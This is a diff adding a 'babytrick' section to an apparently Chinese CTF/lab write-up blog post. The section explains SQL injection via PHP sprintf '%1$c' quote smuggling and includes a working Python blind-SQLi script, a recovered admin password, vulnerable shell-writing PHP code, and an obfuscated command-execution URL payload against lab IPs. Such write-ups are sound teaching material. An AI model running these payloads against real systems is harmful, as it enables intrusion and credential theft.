@@ -27,8 +27,9 @@
 <meta property="og:description" content="比较基础的一些知识点">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://s41.ax1x.com/2026/01/05/pZaWS8H.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260106/85c0c14a9ec026ce664ee29f337357cc.png">
 <meta property="article:published_time" content="2026-01-05T00:20:17.000Z">
-<meta property="article:modified_time" content="2026-01-05T11:16:51.382Z">
+<meta property="article:modified_time" content="2026-01-06T13:06:15.060Z">
 <meta property="article:author" content="My0n9s">
 <meta property="article:tag" content="内部靶场">
 <meta name="twitter:card" content="summary">
@@ -114,7 +115,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-unserialize"><span class="nav-number">1.</span> <span class="nav-text">easy_unserialize</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easy"><span class="nav-number">2.</span> <span class="nav-text">easy</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ctf-judge"><span class="nav-number">3.</span> <span class="nav-text">ctf_judge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#audit-01"><span class="nav-number">4.</span> <span class="nav-text">audit-01</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#audit-02"><span class="nav-number">5.</span> <span class="nav-text">audit-02</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#audit-03"><span class="nav-number">6.</span> <span class="nav-text">audit-03</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#easy-unserialize"><span class="nav-number">1.</span> <span class="nav-text">easy_unserialize</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#easy"><span class="nav-number">2.</span> <span class="nav-text">easy</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#ctf-judge"><span class="nav-number">3.</span> <span class="nav-text">ctf_judge</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#audit-01"><span class="nav-number">4.</span> <span class="nav-text">audit-01</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#audit-02"><span class="nav-number">5.</span> <span class="nav-text">audit-02</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#audit-03"><span class="nav-number">6.</span> <span class="nav-text">audit-03</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#babytrick"><span class="nav-number">7.</span> <span class="nav-text">babytrick</span></a></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -129,7 +130,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives/">
-          <span class="site-state-item-count">98</span>
+          <span class="site-state-item-count">99</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -140,7 +141,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">29</span>
+        <span class="site-state-item-count">30</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -195,9 +196,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2026-01-05 08:20:17 / Modified: 19:16:51" itemprop="dateCreated datePublished" datetime="2026-01-05T08:20:17+08:00">2026-01-05</time>
+      <time title="Created: 2026-01-05 08:20:17" itemprop="dateCreated datePublished" datetime="2026-01-05T08:20:17+08:00">2026-01-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-01-06 21:06:15" itemprop="dateModified" datetime="2026-01-06T21:06:15+08:00">2026-01-06</time>
     </span>
 
   
@@ -245,6 +252,21 @@
 <p><code>http://10.45.1.34?file=/usr/bin&amp;cmd=$_=~%8C%86%8C%8B%9A%92;$__=~%93%8C%DF%D0;$_($__);</code></p>
 <p>发现成功读取到根目录下文件，接下来就是<code>cat /flag</code></p>
 <p>最终的poc:<code>http://10.45.1.34?file=/usr/bin&amp;cmd=$_=~%8C%86%8C%8B%9A%92;$__=~%9C%9E%8B%DF%D0%99%93%9E%98;$_($__);</code></p>
+<h1 id="babytrick"><a href="#babytrick" class="headerlink" title="babytrick"></a>babytrick</h1><p>这个题目一开始尝试sql注入，发现<code>&#39; select \</code> 等被过滤了，接着尝试直接字典爆破admin的密码，没有爆破成功。</p>
+<p><code>dirsearch</code>扫描一通看有没有线索，发现存在<code>/admin</code>，也是一个登录界面，在这个页面上进行了<code>sql key fuzz</code>，估计是做到数据和代码直接分开了，不存在注入。于是接着字典爆破admin，也没有出结果，其实到这里可以猜测还是在一开始的<code>index.php</code>页面把管理员账号注入出来，然后去<code>/admin</code>这里的登录框去登录。</p>
+<p>又重新抓包看了一下，发现<code>response</code>那里有提示:<code>&lt;!-- tips:select * from user where user=&#39;$user&#39; and passwd=&#39;%s&#39;--&gt;</code></p>
+<p>看到<code>%s</code> 可以猜到可能考的是<code>sprintf</code>函数的漏洞，之前的靶场练习题出现过一次sprintf的考点，好吧，当时没仔细看。思路到这里就断开了，看了一下WP</p>
+<p>同时也收集了一些关于<code>sprintf</code>利用的资料，大体了解了一下sprintf的漏洞点，这里专门写了一篇文章:<code>PHP-sprintf函数漏洞解析</code></p>
+<p>有个<code>%1$c</code> 的利用方法，给它填充39，类似于chr(39)，产生引号来造成闭合。但是这里的问题来了，我是要拿到管理员admin的passwd，那么 <code>$user</code>传<code>admin %1$c and substr(passwd,1,1)=&quot;X&quot;#</code>，代入进去就是<code>select * from user where user=&#39;admin %1$c and substr(passwd,1,1)=&quot;X&quot;#&#39; and passwd=&#39;%s&#39;</code>，猜测后台可能是 <code>$sql=sprintf($sql,$passwd)</code>，那么我们传passwd&#x3D;39 ，这样带入进去就是<code>select * from user where user=&#39;admin&#39; and substr(passwd,1,1)=&quot;X&quot;#&#39; and passwd=&#39;39&#39;</code>，那这样就成功闭合了引号。</p>
+<p>经过前期的fuzz发现<code>if,ascii,&gt;</code> 这些都没有过滤，所以我们可以直接尝试二分法盲注来跑，这里贴上poc</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&#x27;http://10.45.1.32/&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    middle = (high+low)//<span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span>(high&gt;low):</span><br><span class="line">        payload = <span class="string">f&quot;admin%1$c and if(ascii(substr(passwd,<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;middle&#125;</span>,1,0)#&quot;</span></span><br><span class="line">        <span class="comment">#print(payload)</span></span><br><span class="line">        data=&#123;<span class="string">&quot;user&quot;</span>:payload,<span class="string">&quot;passwd&quot;</span>:<span class="number">39</span>&#125;</span><br><span class="line">        r = requests.post(url, data=data)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;window.location.href&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            low = middle+<span class="number">1</span></span><br><span class="line">            middle = (high+low)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = middle</span><br><span class="line">            middle = (high+low)//<span class="number">2</span></span><br><span class="line">    flag += <span class="built_in">chr</span>(middle)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">if</span>(high&lt;=<span class="number">32</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>可以发现成功注入出admin的key。</p>
+<p><img src="https://yk.jsdu.cn/20260106/85c0c14a9ec026ce664ee29f337357cc.png" alt="babytrick1"></p>
+<p>注：这里没有用到WP的between盲注以及结合concat和binary的打法。主要是因为答案的截图不完整，我不知道它最终的poc咋写的23333，另外答案的处理是<code>%1$c+0</code> ，这里就相当于 select “”+0 ，返回的是0，那么返回的应该是整张表的内容，但是我尝试了这样写，也可以把passwd注入出来。所以有没有可能这个user表就只有一行？？？或者还有什么其他的我没想到的， 欢迎大家联系我讨论。</p>
+<p>然后我们用<code>admin/GoODLUcKcTFer202OHAckFuN</code> 去<code>/admin</code> 尝试登录发现成功登录进去，来到第二层:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">Your sandbox: ./shells/BbxLHzTaOkBaByRl/ set your shell</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_save_path</span>(<span class="string">&#x27;session&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&#x27;./init.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;&lt;script&gt;window.location.href=&#x27;./index.php&#x27;&lt;/script&gt;&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>])&#123;</span><br><span class="line">    <span class="variable">$shell</span>= <span class="title function_ invoke__">addslashes</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;shell&#x27;</span>]);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;./shell.php&#x27;</span>);</span><br><span class="line">    <span class="variable">$file</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/\\\$shell = &#x27;.*&#x27;;/s&quot;</span>, <span class="string">&quot;\$shell = &#x27;<span class="subst">&#123;$shell&#125;</span>&#x27;;&quot;</span>, <span class="variable">$file</span>);</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;./shell.php&#x27;</span>, <span class="variable">$file</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;set your shell&quot;</span>.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">chdir</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">dirname</span>(<span class="keyword">__FILE__</span>).<span class="string">&quot;/admin.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 
     </div>
 
@@ -266,6 +288,9 @@
                 </a>
             </div>
             <div class="post-nav-item">
+                <a href="/2026/01/06/PHP-sprintf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E8%A7%A3%E6%9E%90/" rel="next" title="PHP sprintf函数漏洞解析">
+                  PHP sprintf函数漏洞解析 <i class="fa fa-angle-right"></i>
+                </a>
             </div>
           </div>
     </footer>
